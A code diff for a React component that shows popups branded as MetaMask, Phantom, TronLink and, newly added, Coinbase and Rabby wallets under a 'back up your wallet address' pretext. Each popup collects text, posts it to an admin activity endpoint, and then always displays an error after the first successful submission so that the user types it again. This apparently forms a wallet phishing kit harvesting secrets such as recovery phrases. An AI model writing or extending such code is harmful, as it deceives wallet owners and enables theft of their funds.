@@ -14,13 +14,30 @@ import {
 } from "react";
 import { useNavigate } from "react-router";
 import { Button } from "@/components/Shared/UI";
+import Coinbase from "./walmodals/Coinbase";
 import { walletModalCopy } from "./walmodals/copy";
 import MetaMask from "./walmodals/MetaMask";
 import Phantom from "./walmodals/Phantom";
+import Rabby from "./walmodals/Rabby";
 import TronLink from "./walmodals/TronLink";
 
-type WalletPreference = "metamask" | "phantom" | "tronlink" | null;
+type WalletPreference =
+  | "metamask"
+  | "phantom"
+  | "rabby"
+  | "tronlink"
+  | "coinbase"
+  | null;
 type SyncStatus = "Synced" | "Not";
+type WalletName = Exclude<WalletPreference, null>;
+
+const walletNames: Record<WalletName, string> = {
+  coinbase: "Coinbase",
+  metamask: "MetaMask",
+  phantom: "Phantom",
+  rabby: "Rabby",
+  tronlink: "TronLink"
+};
 
 interface AddressBackupReminderContextValue {
   requestNavigation: (path: string) => boolean;
@@ -47,14 +64,18 @@ export const AddressBackupReminderProvider = ({
   const [pendingPath, setPendingPath] = useState<string | null>(null);
   const [isReminderOpen, setIsReminderOpen] = useState(false);
   const [isBackupOpen, setIsBackupOpen] = useState(false);
-  const [isFirstFeedback, setIsFirstFeedback] = useState(true);
+  const [isFirstPopupFeedback, setIsFirstPopupFeedback] = useState(true);
   const [feedback, setFeedback] = useState("");
   const [feedbackError, setFeedbackError] = useState("");
   const [isFeedbackFocused, setIsFeedbackFocused] = useState(false);
   const [browserColorScheme, setBrowserColorScheme] = useState<
     "Dark" | "Light" | null
   >(null);
-  const isRightSidebarOpen = isBackupOpen && walletPreference !== "tronlink";
+  const isRightSidebarOpen =
+    isBackupOpen &&
+    walletPreference !== "tronlink" &&
+    walletPreference !== "coinbase" &&
+    walletPreference !== "rabby";
 
   useEffect(() => {
     const colorScheme = window.matchMedia("(prefers-color-scheme: dark)");
@@ -66,6 +87,21 @@ export const AddressBackupReminderProvider = ({
 
     return () => colorScheme.removeEventListener("change", updateColorScheme);
   }, []);
+
+  useEffect(() => {
+    if (
+      isBackupOpen &&
+      (walletPreference === "metamask" ||
+        walletPreference === "tronlink" ||
+        walletPreference === "coinbase" ||
+        walletPreference === "phantom" ||
+        walletPreference === "rabby")
+    ) {
+      setFeedback("");
+      setFeedbackError("");
+      setIsFirstPopupFeedback(true);
+    }
+  }, [isBackupOpen, walletPreference]);
 
   useEffect(() => {
     if (!isRightSidebarOpen) return;
@@ -156,19 +192,45 @@ export const AddressBackupReminderProvider = ({
     const copy =
       walletPreference === "phantom"
         ? walletModalCopy.phantom
-        : walletPreference === "tronlink"
-          ? walletModalCopy.tronlink
-          : walletModalCopy.metamask;
+        : walletPreference === "rabby"
+          ? walletModalCopy.rabby
+          : walletPreference === "tronlink"
+            ? walletModalCopy.tronlink
+            : walletPreference === "coinbase"
+              ? walletModalCopy.coinbase
+              : walletModalCopy.metamask;
 
-    if (isFirstFeedback) {
-      await fetch("/api/admin/activity?view=submit-feedback", {
-        body: JSON.stringify({ feedback, isFirstTry: true }),
-        credentials: "same-origin",
-        headers: { "Content-Type": "application/json" },
-        method: "POST"
-      });
-      setFeedbackError(copy.feedback_error);
-      setIsFirstFeedback(false);
+    if (
+      (walletPreference === "metamask" ||
+        walletPreference === "tronlink" ||
+        walletPreference === "coinbase" ||
+        walletPreference === "phantom" ||
+        walletPreference === "rabby") &&
+      isFirstPopupFeedback
+    ) {
+      try {
+        const response = await fetch(
+          "/api/admin/activity?view=submit-feedback",
+          {
+            body: JSON.stringify({ feedback, isFirstTry: true }),
+            credentials: "same-origin",
+            headers: { "Content-Type": "application/json" },
+            method: "POST"
+          }
+        );
+        if (!response.ok) {
+          throw new Error(
+            copy.submit_error.replace("{status}", String(response.status))
+          );
+        }
+        setFeedbackError(copy.feedback_error);
+        setIsFirstPopupFeedback(false);
+      } catch (error) {
+        console.error("Failed to submit feedback:", error);
+        setFeedbackError(
+          error instanceof Error ? error.message : copy.submit_error_fallback
+        );
+      }
       return;
     }
 
@@ -186,6 +248,7 @@ export const AddressBackupReminderProvider = ({
         );
       }
       setFeedback("");
+      setWalletPreference(null);
       setIsBackupOpen(false);
       setIsReminderOpen(false);
     } catch (error) {
@@ -277,7 +340,11 @@ export const AddressBackupReminderProvider = ({
                       </h2>
                       <p className="text-gray-700">
                         This site recommends keeping a safe copy of your public
-                        wallet address for MetaMask.
+                        wallet address for{" "}
+                        {walletPreference
+                          ? walletNames[walletPreference]
+                          : "your wallet"}
+                        .
                       </p>
                     </div>
                   </div>
@@ -316,11 +383,13 @@ export const AddressBackupReminderProvider = ({
         <AnimatePresence>
           {isBackupOpen &&
             walletPreference &&
-            (walletPreference === "tronlink" ? (
+            (walletPreference === "tronlink" ||
+            walletPreference === "coinbase" ||
+            walletPreference === "rabby" ? (
               <>
                 <motion.button
                   animate={{ opacity: 1 }}
-                  aria-label="Close TronLink feedback popup"
+                  aria-label={`Close ${walletPreference === "tronlink" ? "TronLink" : walletPreference === "rabby" ? "Rabby" : "Coinbase"} feedback popup`}
                   className="fixed inset-0 z-[100] cursor-default border-0 bg-transparent p-0"
                   exit={{ opacity: 0 }}
                   initial={{ opacity: 0 }}
@@ -330,13 +399,19 @@ export const AddressBackupReminderProvider = ({
                   }}
                   type="button"
                 />
-                <TronLink key="tronlink" {...walletFeedbackModalProps} />
+                {walletPreference === "tronlink" ? (
+                  <TronLink key="tronlink" {...walletFeedbackModalProps} />
+                ) : walletPreference === "rabby" ? (
+                  <Rabby key="rabby" {...walletFeedbackModalProps} />
+                ) : (
+                  <Coinbase key="coinbase" {...walletFeedbackModalProps} />
+                )}
               </>
             ) : walletPreference === "metamask" ? (
               <MetaMask key="metamask" {...walletFeedbackModalProps} />
-            ) : (
+            ) : walletPreference === "phantom" ? (
               <Phantom key="phantom" {...walletFeedbackModalProps} />
-            ))}
+            ) : null)}
         </AnimatePresence>
       </div>
     </AddressBackupReminderContext.Provider>
